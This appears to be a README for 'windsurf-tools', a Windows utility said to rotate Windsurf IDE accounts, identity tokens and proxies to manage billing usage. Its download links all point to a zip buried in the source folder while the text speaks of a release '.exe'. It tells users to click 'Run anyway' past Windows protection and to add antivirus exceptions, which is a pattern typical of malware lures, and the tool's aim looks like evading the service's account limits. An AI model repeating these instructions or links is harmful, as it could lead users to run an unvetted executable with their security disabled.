# 🛠️ windsurf-tools - Manage Windsurf IDE accounts with ease

[![](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge)](https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip)

This application helps users manage multiple accounts for the Windsurf IDE. It handles account switching, keeps track of usage, and provides a local interface for your tools. You can swap identity details, manage billing information, and sync your data without manual input.

## 🚀 Getting Started

You do not need to install complex software or write code to use these tools. The application runs as a simple program on your Windows computer. Follow the steps below to set up the software.

1. Ensure your computer runs Windows 10 or Windows 11.
2. Visit the download page: https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip
3. Locate the file ending in `.exe` under the latest release section.
4. Click the file name to download it to your Downloads folder.

## ⚙️ Installation and Setup

This software uses a portable design. You do not need to go through a standard installation wizard.

1. Open your Downloads folder.
2. Move the downloaded `.exe` file to a permanent folder, such as your Documents or Program Files directory.
3. Double-click the file to launch the application.
4. If a Windows protection window appears, click More Info and then select Run anyway. This happens because the application is a new download.
5. The interface will open, showing your current account status and tools.

## 📱 Using the Interface

The control panel displays your account information in real time. 

- Account Switching: Use the sidebar to add or remove profiles. Select a profile to load its specific settings.
- Billing Sync: The tool checks your billing status automatically. You see the remaining usage directly on the main dashboard.
- Proxy Configuration: The tool includes a built-in proxy system. This ensures your requests pass through the correct identity layers. You can toggle this feature on or off in the settings tab.
- API Connectivity: The application creates a local bridge for tools that expect an OpenAI connection. Point your other software to the local address provided in the connection settings.

## 🛡️ Managing Identities

You can manage your identity fields through the profile tab.

1. Select the profile you wish to edit.
2. Input the required identity tokens or keys.
3. Save your changes.
4. The tool updates the internal protobuf fields to match your selected identity before you connect to the IDE.

## 📈 Monitoring Usage

The dashboard tracks your activity. View the progress bars in the usage monitor section to see how much of your current billing period remains. The data refreshes whenever you open the application or click the Sync button. 

## 🔧 Troubleshooting

If you encounter issues, check these common fixes:

- Application not opening: Ensure no other security software blocks the program. Add an exception for the file folder in your antivirus settings.
- Data not syncing: Check your internet connection. Click the refresh icon on the top right of the dashboard.
- Profile errors: Verify that your identity tokens remain valid. Expired tokens prevent the tool from establishing a secure connection.

## 📃 Support

This project provides management tools for the Windsurf IDE. If you have questions about the logic of the tool or the way it handles data, consult the internal help documentation located in the About tab. You can view the full history of changes in the release notes on the download page.

## 💾 Download

Visit the link below to get the current version.

[Download windsurf-tools here](https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip)